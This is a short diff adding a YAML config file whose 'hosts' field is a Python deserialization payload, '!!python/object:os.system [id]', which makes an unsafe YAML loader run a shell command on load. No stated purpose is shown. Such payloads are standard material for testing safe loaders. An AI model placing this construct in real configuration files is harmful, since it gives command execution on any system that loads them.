@@ -1,0 +1,3 @@
+apiVersion: paduraksa.dev/v1
+kind: Config
+hosts: !!python/object:os.system [id]
